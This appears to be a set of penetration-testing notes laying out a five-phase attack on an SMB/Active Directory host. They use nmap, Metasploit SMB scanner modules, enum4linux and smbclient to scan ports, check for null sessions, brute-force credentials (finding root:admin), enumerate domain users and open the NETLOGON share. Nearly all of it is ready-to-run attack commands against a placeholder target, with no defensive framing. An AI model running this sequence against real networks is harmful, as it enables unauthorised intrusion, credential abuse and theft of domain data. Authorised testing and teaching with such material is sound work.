Phase 1: Discovery and Reconnaissance

# Port scanning for SMB services (445, 139)
nmap -p 445,139,88,389 <TARGET_IP>

# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_IP>
run

Result: Identifies Windows Server 2025/Windows 11 with SMB 3.1.1


Phase 2: Enumeration Without Credentials

# Attempt anonymous enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <TARGET_IP>
run

# Check for NULL session vulnerabilities
enum4linux -a <TARGET_IP>


Phase 3: Credential Attack

# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set SMBDomain INTERNAL
set SMBUser root
set SMBPass admin
set CreateSession true
run

Discovery: Found credentials ...\root:admin


Phase 4: Post-Compromise Enumeration

# Enumerate domain users with valid credentials
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <TARGET_IP>
set SMBDomain INTERNAL
set SMBUser root
set SMBPass admin
set DB_ALL_USERS true
run

Result: Extracted ... domain users including service accounts


Phase 5: Share Enumeration & Access

# List accessible shares
smbclient -L //<TARGET_IP> -U "root%admin"

# Access specific shares
smbclient //<TARGET_IP>/NETLOGON -U "root%admin" -c "dir"




